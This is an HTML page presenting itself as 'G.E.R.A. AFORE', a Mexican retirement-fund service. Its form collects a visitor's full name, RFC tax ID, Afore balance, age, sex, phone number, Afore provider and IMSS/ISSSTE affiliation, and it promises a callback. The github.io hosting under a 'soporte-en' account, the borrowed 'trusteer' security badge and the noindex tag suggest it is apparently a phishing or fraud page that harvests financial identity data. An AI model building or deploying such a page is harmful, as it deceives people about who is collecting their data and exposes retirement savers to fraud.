<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&display=swap" rel="stylesheet">  
	<link rel="stylesheet" href="css/estilos2.css">
	<link rel="icon" href="icon.ico">
	<meta name="robots" content="noindex, nofollow">

	<meta property="og:locale" content="es_ES" />
	<meta property="og:type" content="website" />
	<meta property="og:title" content="G.E.R.A. ES TU MEJOR ALIADO">
	<meta property="og:description" content="G.E.R.A. ES TU MEJOR ALIADO PARA LA CONSOLIDACIÓN DE TUS PROYECTOS Y ESTABILIDAD ECONÓMICA.">
	<meta property="og:site_name" content="G.E.R.A. ES TU MEJOR ALIADO" />

	<meta property="og:image" content="https://soporte-en.github.io/G.E.R.A-Afore/img/tip.png">
	<meta property="og:image:width" content="1093" />
	<meta property="og:image:height" content="666" />
	<meta property="og:image:type" content="image/png" />
	<link rel="apple-touch-icon" sizes="114x114" href="https://soporte-en.github.io/G.E.R.A-Afore/img/tip.png"/>
    <meta name="msapplication-TileImage" content="https://soporte-en.github.io/G.E.R.A-Afore/img/tip.png" sizes="144x144"/>


	<title>GERA AFORE | México</title>
</head>
<body>
	
	<div class="contenedor">
		
		<div class="columna-top-rwd">

		</div>
		<div class="columna-derecha">
			
		</div>

		<div class="columna-izquierda">
			<div class="registro activo" id="registro">
				<div class="header">
					<h1><strong>Datos De Contacto</strong></h1>
					<br>
				</div>
		
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Nombre Completo</b>
						</p><br>
						<label for="nombre"></label>
					<div class="contenedor-input">
						<input type="text" input id="nombre" onKeyUp="document.getElementById(this.id).value=document.getElementById(this.id).value.toUpperCase()" name="nombre" placeholder="Nombre" required/>
					</div>
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>RFC</b>
						</p><br>
						<label for="nombre"></label>
					<div class="contenedor-input">
						<input type="text" input id="rfc" onKeyUp="document.getElementById(this.id).value=document.getElementById(this.id).value.toUpperCase()" name="rfc" placeholder="RFC" required/>
					</div>
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Saldo Actual De Tu Afore</b>
						</p><br>
						<label for="nombre">Opcional</label>
					<div class="contenedor-input">
						<input type="number" input id="saldo" onKeyUp="document.getElementById(this.id).value=document.getElementById(this.id).value.toUpperCase()" name="saldo" placeholder="Saldo"/>
					</div>
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Edad</b>
						</p><br>
						<label for="nombre"></label>
					<div class="contenedor-input">
						<input type="number" input id="edad" onKeyUp="document.getElementById(this.id).value=document.getElementById(this.id).value.toUpperCase()" name="edad" placeholder="Edad" required/>
					</div>
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Sexo</b>
						</p><br>
						<label for="nombre"></label>
					<div class="contenedor-input">
						<input type="text" input id="sexo" onKeyUp="document.getElementById(this.id).value=document.getElementById(this.id).value.toUpperCase()" name="sexo" placeholder="M/F" required/>
					</div>
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>No Telefonico</b>
						</p><br>
						<label for="nombre"></label>
					<div class="contenedor-input">
						<input type="tel" input id="telefono" onKeyUp="document.getElementById(this.id).value=document.getElementById(this.id).value.toUpperCase()" name="telefono" placeholder="+52" required/>
					</div>
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Empresa De Tu Afore</b>
						</p><br>
						<label for="nombre"></label>
					<div class="contenedor-input">
						<input type="text" input id="empresa" onKeyUp="document.getElementById(this.id).value=document.getElementById(this.id).value.toUpperCase()" name="empresa" placeholder="Afore" required/>
					</div>
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Cotiza Para IMSS o ISSSTE</b>
						</p><br>
						<label for="nombre"></label>
					<div class="contenedor-input">
						<input type="text" input id="imss" onKeyUp="document.getElementById(this.id).value=document.getElementById(this.id).value.toUpperCase()" name="imss" placeholder="IMSS o ISSSTE" required/>
					</div>
		
			
					
		
					<div class="contenedor-boton">
							<button type="submit">
							Continuar
							
						</button>
					</div>
					
				</form>
				<div class="true"><img src="img/trusteer-2.jpg"></div>
				
			</div>
			
			<div class="header exito" id="exito">

					<h2 class="txtFolio">Datos Recibidos</h2>
					<div class="loading"><img src="img/loading-gif.gif"></div>
					<p class="txt">A La Mayor Brevedad Nos Pondremos En Contacto.</p>
					<h1 class="folio"></h1>			

			

			

			</div>

		</div>
		<script src="js/form.js"></script> 
		
	</div>

	
		

</body>
</html>
